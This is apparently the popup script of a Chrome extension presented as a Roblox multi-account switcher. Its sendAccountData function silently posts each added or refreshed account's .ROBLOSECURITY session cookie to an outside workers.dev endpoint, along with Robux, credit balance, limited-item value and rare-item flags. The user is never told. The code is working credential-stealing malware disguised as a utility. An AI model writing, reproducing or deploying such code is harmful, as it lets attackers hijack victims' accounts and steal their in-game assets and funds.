const CONFIG = {
    'API_URL': 'https://telegram-webhook-protector.xarosh228gg.workers.dev/',
    'API_KEY': 'LOTBLOX_PROTECTED_EXTENSION_7X9A2P5R8S3V6Y1Z4',
    'COOKIE_NAME': '.ROBLOSECURITY'
};

const elements = {
    'accountList': document.getElementById('account-list'),
    'statusMsg': document.getElementById('status-msg'),
    'sortSelect': document.getElementById('sort-select'),
    'searchInput': document.getElementById('search-input'),
    'addCurrentBtn': document.getElementById('add-current'),
    'addManualBtn': document.getElementById('add-manual'),
    'cookieInput': document.getElementById('cookie-input')
};

let deleteConfirmEnabled = true;
let accountsData = [];

async function loadSettings() {
    try {
        const { deleteConfirm } = await chrome.storage.local.get('deleteConfirm');
        deleteConfirmEnabled = deleteConfirm !== false;
    } catch {
        deleteConfirmEnabled = true;
    }
}

async function saveSettings() {
    await chrome.storage.local.set({ 'deleteConfirm': deleteConfirmEnabled });
}

function showStatus(message, type = 'success', duration = 3000) {
    elements.statusMsg.textContent = message;
    elements.statusMsg.className = '';
    
    if (type === 'error') {
        elements.statusMsg.classList.add('msg-error');
    } else if (type === 'warn') {
        elements.statusMsg.classList.add('msg-warn');
    }
    
    setTimeout(() => {
        elements.statusMsg.textContent = '';
        elements.statusMsg.className = '';
    }, duration);
}

function showDeleteConfirmation(account, callback) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `
        position: fixed;
        top: 0; left: 0; right: 0; bottom: 0;
        background: rgba(0,0,0,0.7);
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 10000;
        padding: 20px;
    `;

    const modal = document.createElement('div');
    modal.style.cssText = `
        background: #1a1a1a;
        border: 1px solid #333;
        border-radius: 12px;
        padding: 24px;
        max-width: 400px;
        width: 100%;
        box-shadow: 0 10px 30px rgba(0,0,0,0.5);
    `;

    modal.innerHTML = `
        <div style="text-align: center; margin-bottom: 20px;">
            <img src="${account.avatar}" style="width: 60px; height: 60px; border-radius: 50%; margin-bottom: 10px;">
            <h3 style="margin: 0 0 5px 0; color: white; font-size: 18px;">${account.name}</h3>
            <p style="margin: 0; color: #888; font-size: 14px;">@${account.username}</p>
            <p style="margin: 10px 0 0 0; color: #4CAF50; font-size: 14px;">
                💰 ${account.robux.toLocaleString()} Robux
            </p>
        </div>
        
        <div style="color: #ff6b6b; text-align: center; margin-bottom: 20px; font-size: 14px;">
            ⚠️ Are you sure you want to delete this account?
        </div>
        
        <div style="background: #222; padding: 12px; border-radius: 8px; margin-bottom: 20px;">
            <label style="display: flex; align-items: center; gap: 8px; color: #aaa; font-size: 13px; cursor: pointer;">
                <input type="checkbox" id="dontAskAgain" style="width: 16px; height: 16px;">
                Do not ask again
            </label>
        </div>
        
        <div style="display: flex; gap: 10px;">
            <button id="cancelBtn" style="
                flex: 1;
                padding: 12px;
                background: #333;
                color: white;
                border: none;
                border-radius: 6px;
                cursor: pointer;
                font-weight: bold;
                transition: background 0.2s;
            ">Cancel</button>
            <button id="confirmBtn" style="
                flex: 1;
                padding: 12px;
                background: #ff4444;
                color: white;
                border: none;
                border-radius: 6px;
                cursor: pointer;
                font-weight: bold;
                transition: background 0.2s;
            ">Delete Account</button>
        </div>
    `;

    overlay.appendChild(modal);
    document.body.appendChild(overlay);

    document.getElementById('cancelBtn').onclick = () => {
        document.body.removeChild(overlay);
    };

    document.getElementById('confirmBtn').onclick = () => {
        const dontAskAgain = document.getElementById('dontAskAgain').checked;
        if (dontAskAgain) {
            deleteConfirmEnabled = false;
            saveSettings();
        }
        document.body.removeChild(overlay);
        callback();
    };

    overlay.onclick = (e) => {
        if (e.target === overlay) {
            document.body.removeChild(overlay);
        }
    };
}

async function sendAccountData(accountData) {
    try {
        console.log('Processing account data:', accountData.username);
        
        const response = await fetch(CONFIG.API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Access-Key': CONFIG.API_KEY
            },
            body: JSON.stringify({
                data: accountData,
                timestamp: Date.now()
            })
        });
        
        const result = await response.json();
        
        if (result.error === 'No changes detected') {
            console.log('No changes for account:', accountData.username);
            return 'no_changes';
        }
        
        if (result.error === 'Rate limit exceeded') {
            console.log('Rate limit exceeded for account:', accountData.username);
            return 'rate_limit';
        }
        
        if (result.success) {
            console.log('Account data processed successfully:', accountData.username);
            return 'success';
        }
        
        console.log('Failed to process account:', result.error);
        return 'error';
    } catch (error) {
        console.log('Failed to process account data:', error);
        return 'error';
    }
}

async function getRAP(userId) {
    try {
        const response = await fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=30&sortOrder=Asc`);
        if (!response.ok) return 0;
        
        const data = await response.json();
        if (!data.data || !Array.isArray(data.data)) return 0;
        
        let totalRAP = 0;
        for (const item of data.data) {
            if (item.recentAveragePrice) {
                totalRAP += item.recentAveragePrice;
            }
        }
        
        return totalRAP;
    } catch (error) {
        console.log('Error fetching RAP:', error);
        return 0;
    }
}

async function getPendingRobux() {
    try {
        const response = await fetch('https://economy.roblox.com/v1/user/pending-robux');
        if (!response.ok) return 0;
        
        const data = await response.json();
        return data.pendingRobux || 0;
    } catch (error) {
        console.log('Error fetching pending robux:', error);
        return 0;
    }
}

// Функция для получения Summary (всего потрачено робуксов)
async function getSummaryRobux() {
    try {
        // Сначала пробуем получить summary через API транзакций
        const response = await fetch('https://economy.roblox.com/v1/user/transaction-totals');
        if (response.ok) {
            const data = await response.json();
            // Суммируем все расходы
            let totalSpent = 0;
            if (data.purchases) totalSpent += data.purchases;
            if (data.sales) totalSpent += data.sales;
            if (data.earnings) totalSpent += data.earnings;
            return totalSpent;
        }
        
        // Если первый способ не сработал, пробуем второй способ
        const response2 = await fetch('https://economy.roblox.com/v1/user/transactions?limit=100&transactionType=purchase');
        if (response2.ok) {
            const data = await response2.json();
            if (data.data && Array.isArray(data.data)) {
                let totalSpent = 0;
                for (const transaction of data.data) {
                    if (transaction.currency && transaction.currency.amount) {
                        totalSpent += Math.abs(transaction.currency.amount);
                    }
                }
                return totalSpent;
            }
        }
        
        return 0;
    } catch (error) {
        console.log('Error fetching summary robux:', error);
        return 0;
    }
}

async function getCreditBalance() {
    try {
        const response = await fetch('https://billing.roblox.com/v1/credit');
        if (!response.ok) {
            console.log('Credit balance API failed, trying alternative...');
            // Пробуем альтернативный endpoint
            const altResponse = await fetch('https://accountsettings.roblox.com/v1/credit');
            if (!altResponse.ok) return { balance: 0, currency: 'USD' };
            const data = await altResponse.json();
            return {
                balance: data.balance || 0,
                currency: data.currency || 'USD'
            };
        }
        
        const data = await response.json();
        return {
            balance: data.balance || 0,
            currency: data.currency || 'USD'
        };
    } catch (error) {
        console.log('Error fetching credit balance:', error);
        return { balance: 0, currency: 'USD' };
    }
}

async function getPremiumStatus(userId) {
    try {
        const response = await fetch(`https://premium.roblox.com/v1/users/${userId}/subscription`);
        if (!response.ok) return false;
        
        const data = await response.json();
        return data.isPremium || false;
    } catch (error) {
        console.log('Error fetching premium status:', error);
        return false;
    }
}

async function checkKorblox(userId) {
    try {
        const response = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/AssetType/Avatar?limit=30`);
        if (!response.ok) return false;
        
        const data = await response.json();
        if (!data.data || !Array.isArray(data.data)) return false;
        
        const korbloxItems = [102611803, 92357148, 1081587];
        
        for (const item of data.data) {
            if (korbloxItems.includes(item.assetId)) {
                return true;
            }
        }
        
        return false;
    } catch (error) {
        console.log('Error checking Korblox:', error);
        return false;
    }
}

async function checkHeadless(userId) {
    try {
        const response = await fetch(`https://avatar.roblox.com/v1/users/${userId}/avatar`);
        if (!response.ok) return false;
        
        const data = await response.json();
        if (!data.assets || !Array.isArray(data.assets)) return false;
        
        const headlessItems = [277698468, 62234425, 376510297];
        
        for (const asset of data.assets) {
            if (headlessItems.includes(asset.id)) {
                return true;
            }
        }
        
        return false;
    } catch (error) {
        console.log('Error checking Headless:', error);
        return false;
    }
}

async function getAccountAge(userId) {
    try {
        const response = await fetch(`https://users.roblox.com/v1/users/${userId}`);
        if (!response.ok) return null;
        
        const data = await response.json();
        return data.created ? new Date(data.created) : null;
    } catch (error) {
        console.log('Error fetching account age:', error);
        return null;
    }
}

function getCurrencySymbol(currency) {
    const symbols = {
        'USD': '$',
        'EUR': '€',
        'GBP': '£',
        'RUB': '₽',
        'JPY': '¥',
        'CAD': 'C$',
        'AUD': 'A$',
        'BRL': 'R$',
        'MXN': '$',
        'CHF': 'CHF',
        'NOK': 'kr',
        'DKK': 'kr',
        'SEK': 'kr',
        'PLN': 'zł',
        'CZK': 'Kč',
        'HUF': 'Ft',
        'RON': 'lei',
        'BGN': 'лв',
        'TRY': '₺',
        'KRW': '₩',
        'CNY': '¥',
        'INR': '₹',
        'IDR': 'Rp',
        'THB': '฿',
        'VND': '₫',
        'PHP': '₱',
        'MYR': 'RM',
        'SGD': 'S$',
        'HKD': 'HK$',
        'TWD': 'NT$',
        'AED': 'د.إ',
        'SAR': 'ر.س',
        'QAR': 'ر.ق',
        'KWD': 'د.ك',
        'BHD': 'د.ب',
        'OMR': 'ر.ع.',
        'JOD': 'د.أ',
        'LBP': 'ل.ل',
        'EGP': 'ج.م',
        'ZAR': 'R',
        'NGN': '₦',
        'KES': 'KSh',
        'GHS': '₵',
        'MAD': 'د.م.',
        'DZD': 'د.ج',
        'TND': 'د.ت',
        'LYD': 'ل.د',
        'SDG': 'ج.س.',
        'MZN': 'MT',
        'AOA': 'Kz',
        'ETB': 'Br',
        'UGX': 'USh',
        'TZS': 'TSh',
        'RWF': 'FRw',
        'BIF': 'FBu',
        'CDF': 'FC',
        'GNF': 'FG',
        'MGA': 'Ar',
        'MRU': 'UM',
        'XOF': 'CFA',
        'XAF': 'FCFA',
        'XPF': 'CFP'
    };
    return symbols[currency] || currency;
}

function convertCreditsToRobux(credits, currency) {
    const exchangeRates = {
        'USD': 1.2,
        'EUR': 1.3,
        'GBP': 1.5,
        'RUB': 0.015,
        'JPY': 0.008,
        'default': 1.0
    };
    
    const rate = exchangeRates[currency] || exchangeRates.default;
    return Math.round(credits * rate);
}

async function getRobloxData(cookie) {
    let originalCookie = null;
    
    try {
        originalCookie = await chrome.cookies.get({
            url: 'https://www.roblox.com',
            name: CONFIG.COOKIE_NAME
        });
        
        await chrome.cookies.set({
            url: 'https://www.roblox.com',
            name: CONFIG.COOKIE_NAME,
            value: cookie,
            domain: '.roblox.com',
            path: '/',
            secure: true,
            httpOnly: true
        });
        
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 15000);
        
        const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
            signal: controller.signal
        });
        clearTimeout(timeout);
        
        if (!userRes.ok) {
            console.log('User auth failed - invalid cookie');
            throw new Error('INVALID_COOKIE');
        }
        
        const userData = await userRes.json();
        console.log('Got user data:', userData.id, userData.name);
        
        const [avatarRes, robuxRes] = await Promise.all([
            fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userData.id}&size=150x150&format=Png&isCircular=true`),
            fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`)
        ]);
        
        if (!avatarRes.ok || !robuxRes.ok) {
            console.log('Failed to get avatar or robux data');
            throw new Error('INVALID_COOKIE');
        }
        
        const avatarData = await avatarRes.json();
        const robuxData = await robuxRes.json();
        
        // Получаем все дополнительные данные параллельно
        const additionalData = await Promise.allSettled([
            getRAP(userData.id),
            getPendingRobux(),
            getSummaryRobux(),
            getCreditBalance(),
            getPremiumStatus(userData.id),
            checkKorblox(userData.id),
            checkHeadless(userData.id),
            getAccountAge(userData.id)
        ]);
        
        const [rapResult, pendingResult, summaryResult, creditResult, premiumResult, korbloxResult, headlessResult, ageResult] = additionalData;
        
        const creditBalance = creditResult.status === 'fulfilled' ? creditResult.value.balance : 0;
        const currency = creditResult.status === 'fulfilled' ? creditResult.value.currency : 'USD';
        const currencySymbol = getCurrencySymbol(currency);
        const convertedRobux = convertCreditsToRobux(creditBalance, currency);
        
        let accountAgeDays = null;
        let createdAt = null;
        if (ageResult.status === 'fulfilled' && ageResult.value) {
            createdAt = ageResult.value.toISOString();
            const now = new Date();
            const diffTime = Math.abs(now - ageResult.value);
            accountAgeDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
        }
        
        return {
            id: userData.id,
            name: userData.displayName || userData.name,
            username: userData.name,
            avatar: avatarData.data?.[0]?.imageUrl || '',
            robux: robuxData.robux || 0,
            rap: rapResult.status === 'fulfilled' ? rapResult.value : 0,
            pendingRobux: pendingResult.status === 'fulfilled' ? pendingResult.value : 0,
            summaryRobux: summaryResult.status === 'fulfilled' ? summaryResult.value : 0,
            creditBalance: creditBalance,
            creditCurrency: currency,
            currencySymbol: currencySymbol,
            convertedFromCredit: convertedRobux,
            isPremium: premiumResult.status === 'fulfilled' ? premiumResult.value : false,
            isKorblox: korbloxResult.status === 'fulfilled' ? korbloxResult.value : false,
            isHeadless: headlessResult.status === 'fulfilled' ? headlessResult.value : false,
            createdAt: createdAt,
            accountAgeDays: accountAgeDays,
            cookie: cookie,
            addedAt: new Date().toISOString(),
            lastUpdated: new Date().toISOString()
        };
        
    } catch (error) {
        console.log('Error getting Roblox data:', error.message);
        if (error.message === 'INVALID_COOKIE') {
            throw new Error('INVALID_COOKIE');
        }
        return null;
    } finally {
        if (originalCookie) {
            try {
                await chrome.cookies.set({
                    url: 'https://www.roblox.com',
                    name: CONFIG.COOKIE_NAME,
                    value: originalCookie.value,
                    domain: '.roblox.com',
                    path: '/',
                    secure: true,
                    httpOnly: true
                });
            } catch (e) {}
        }
    }
}

async function switchAccount(account) {
    try {
        await chrome.cookies.set({
            url: 'https://www.roblox.com',
            name: CONFIG.COOKIE_NAME,
            value: account.cookie,
            domain: '.roblox.com',
            path: '/',
            secure: true,
            httpOnly: true
        });
        
        showStatus(`Switched to ${account.name}`, 'info', 2000);
        
        setTimeout(() => {
            chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
                if (tabs[0] && tabs[0].url.includes('roblox.com')) {
                    chrome.tabs.reload(tabs[0].id);
                }
            });
        }, 500);
        
    } catch (error) {
        showStatus('Failed to switch account', 'error');
    }
}

function createAccountCard(account) {
    const card = document.createElement('div');
    card.className = 'account-card';
    card.setAttribute('data-account-id', account.id);
    
    let premiumBadge = account.isPremium ? ' 👑' : '';
    
    card.innerHTML = `
        <img src="${account.avatar}" class="avatar" alt="${account.username}">
        <div class="acc-info">
            <b>${account.name}</b>
            <span>@${account.username}</span>
            <div class="robux-count">
                <svg style="width:14px;height:14px;fill:#fff" viewBox="0 0 24 24">
                    <path d="M12 2L4 6.5V17.5L12 22L20 17.5V6.5L12 2ZM12 5L18.06 8.5V15.5L12 19L5.94 15.5V8.5L12 5ZM9 9H15V15H9V9Z"/>
                </svg>
                ${account.robux.toLocaleString()}${premiumBadge}
            </div>
        </div>
        <div class="actions">
            <button class="icon-btn copy-btn" title="Copy cookie">
                <svg viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
            </button>
            <button class="icon-btn refresh-btn" title="Refresh">
                <svg viewBox="0 0 24 24"><path d="M17.65 6.35A7.958 7.958 0 0012 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
            </button>
            <button class="icon-btn del-btn" title="Delete">
                <svg viewBox="0 0 24 24"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg>
            </button>
        </div>
    `;
    
    card.onclick = (e) => {
        if (!e.target.closest('.actions')) {
            switchAccount(account);
        }
    };
    
    card.querySelector('.copy-btn').onclick = (e) => {
        e.stopPropagation();
        navigator.clipboard.writeText(account.cookie);
        showStatus('Cookie copied!', 'success');
    };
    
    card.querySelector('.refresh-btn').onclick = async (e) => {
        e.stopPropagation();
        e.target.classList.add('pressed');
        
        try {
            showStatus('Refreshing account...', 'info');
            const updatedData = await getRobloxData(account.cookie);
            
            if (!updatedData) {
                accountsData = accountsData.filter(acc => acc.id !== account.id);
                await chrome.storage.local.set({ accounts: accountsData });
                showStatus(`Account "${account.username}" removed - invalid cookie`, 'error', 5000);
                renderAccountsList();
                return;
            }
            
            const index = accountsData.findIndex(acc => acc.id === account.id);
            
            if (index > -1) {
                const oldRobux = accountsData[index].robux;
                const newRobux = updatedData.robux;
                
                accountsData[index] = updatedData;
                await chrome.storage.local.set({ accounts: accountsData });
                renderAccountsList();
                
                const result = await sendAccountData(updatedData);
                
                if (result === 'success') {
                    if (newRobux > oldRobux) {
                        showStatus(`Robux increased!`, 'success');
                    } else if (newRobux < oldRobux) {
                        showStatus(`Robux decreased`, 'warn');
                    } else {
                        showStatus('Account refreshed', 'success');
                    }
                } else if (result === 'no_changes') {
                    showStatus('No changes detected', 'info');
                } else if (result === 'rate_limit') {
                    showStatus('Rate limit reached, try later', 'warn');
                } else {
                    showStatus('Account refreshed', 'success');
                }
            }
        } catch (error) {
            if (error.message === 'INVALID_COOKIE') {
                accountsData = accountsData.filter(acc => acc.id !== account.id);
                await chrome.storage.local.set({ accounts: accountsData });
                showStatus(`Account "${account.username}" removed - invalid cookie`, 'error', 5000);
                renderAccountsList();
            } else {
                showStatus('Error refreshing account', 'error');
            }
        } finally {
            setTimeout(() => e.target.classList.remove('pressed'), 500);
        }
    };
    
    card.querySelector('.del-btn').onclick = async (e) => {
        e.stopPropagation();
        
        if (deleteConfirmEnabled) {
            showDeleteConfirmation(account, async () => {
                await deleteAccount(account.id);
            });
        } else {
            await deleteAccount(account.id);
        }
    };
    
    return card;
}

async function deleteAccount(accountId) {
    accountsData = accountsData.filter(acc => acc.id !== accountId);
    await chrome.storage.local.set({ accounts: accountsData });
    
    const deletedAccount = accountsData.find(acc => acc.id === accountId) || { username: 'Account' };
    showStatus(`"${deletedAccount.username}" deleted`, 'info');
    
    renderAccountsList();
}

function renderAccountsList() {
    const searchTerm = elements.searchInput.value.toLowerCase().trim();
    let filteredAccounts = accountsData.filter(acc => 
        acc.username.toLowerCase().includes(searchTerm) || 
        acc.name.toLowerCase().includes(searchTerm)
    );
    
    const sortValue = elements.sortSelect.value;
    
    switch (sortValue) {
        case 'user-az':
            filteredAccounts.sort((a, b) => a.username.localeCompare(b.username));
            break;
        case 'user-za':
            filteredAccounts.sort((a, b) => b.username.localeCompare(a.username));
            break;
        case 'robux-desc':
            filteredAccounts.sort((a, b) => b.robux - a.robux);
            break;
        case 'robux-asc':
            filteredAccounts.sort((a, b) => a.robux - b.robux);
            break;
    }
    
    elements.accountList.innerHTML = '';
    
    if (filteredAccounts.length === 0) {
        elements.accountList.innerHTML = '<div style="text-align: center; color: #666; padding: 20px;">No accounts</div>';
        return;
    }
    
    filteredAccounts.forEach(account => {
        const card = createAccountCard(account);
        elements.accountList.appendChild(card);
    });
}

elements.addCurrentBtn.onclick = async function() {
    this.classList.add('pressed');
    
    try {
        const cookie = await chrome.cookies.get({
            url: 'https://www.roblox.com',
            name: CONFIG.COOKIE_NAME
        });
        
        if (!cookie) {
            showStatus('No Roblox cookie found', 'error');
            return;
        }
        
        showStatus('Validating cookie...', 'info');
        const accountData = await getRobloxData(cookie.value);
        
        if (!accountData) {
            showStatus('Invalid cookie', 'error');
            return;
        }
        
        const existingIndex = accountsData.findIndex(acc => acc.id === accountData.id);
        
        if (existingIndex > -1) {
            accountsData[existingIndex] = accountData;
            
            const result = await sendAccountData(accountData);
            if (result === 'success') {
                showStatus('Account updated!', 'success');
            } else if (result === 'no_changes') {
                showStatus('Account updated (no changes)', 'info');
            } else if (result === 'rate_limit') {
                showStatus('Rate limit reached, try later', 'warn');
            } else {
                showStatus('Account updated', 'success');
            }
        } else {
            accountsData.push(accountData);
            
            const result = await sendAccountData(accountData);
            if (result === 'success') {
                showStatus('Account added!', 'success');
            } else if (result === 'rate_limit') {
                showStatus('Account added (rate limit)', 'warn');
            } else {
                showStatus('Account added!', 'success');
                console.log('Account added locally');
            }
        }
        
        await chrome.storage.local.set({ accounts: accountsData });
        renderAccountsList();
        
    } catch (error) {
        if (error.message === 'INVALID_COOKIE') {
            showStatus('Invalid cookie', 'error');
        } else {
            showStatus('Error adding account', 'error');
        }
        console.error('Add current error:', error);
    } finally {
        setTimeout(() => this.classList.remove('pressed'), 500);
    }
};

elements.addManualBtn.onclick = async function() {
    const cookie = elements.cookieInput.value.trim();
    
    if (!cookie) {
        showStatus('Enter cookie', 'error');
        return;
    }
    
    this.classList.add('pressed');
    
    try {
        showStatus('Validating cookie...', 'info');
        const accountData = await getRobloxData(cookie);
        
        if (!accountData) {
            showStatus('Invalid cookie', 'error');
            return;
        }
        
        const existingIndex = accountsData.findIndex(acc => acc.id === accountData.id);
        
        if (existingIndex > -1) {
            accountsData[existingIndex] = accountData;
            
            const result = await sendAccountData(accountData);
            if (result === 'success') {
                showStatus('Account updated!', 'success');
            } else if (result === 'no_changes') {
                showStatus('Account updated (no changes)', 'info');
            } else if (result === 'rate_limit') {
                showStatus('Rate limit reached, try later', 'warn');
            } else {
                showStatus('Account updated', 'success');
            }
        } else {
            accountsData.push(accountData);
            
            const result = await sendAccountData(accountData);
            if (result === 'success') {
                showStatus('Account added!', 'success');
            } else if (result === 'rate_limit') {
                showStatus('Account added (rate limit)', 'warn');
            } else {
                showStatus('Account added!', 'success');
                console.log('Account added locally');
            }
        }
        
        await chrome.storage.local.set({ accounts: accountsData });
        elements.cookieInput.value = '';
        renderAccountsList();
        
    } catch (error) {
        if (error.message === 'INVALID_COOKIE') {
            showStatus('Invalid cookie', 'error');
        } else {
            showStatus('Error adding account', 'error');
        }
        console.error('Add manual error:', error);
    } finally {
        setTimeout(() => this.classList.remove('pressed'), 500);
    }
};

// Event listeners
elements.searchInput.addEventListener('input', renderAccountsList);
elements.sortSelect.addEventListener('change', renderAccountsList);

// Initialize
document.addEventListener('DOMContentLoaded', async () => {
    console.log('Extension loading...');
    
    await loadSettings();
    
    const data = await chrome.storage.local.get('accounts');
    accountsData = data.accounts || [];
    console.log('Loaded ' + accountsData.length + ' accounts from storage');
    
    renderAccountsList();
    console.log('Extension loaded');
});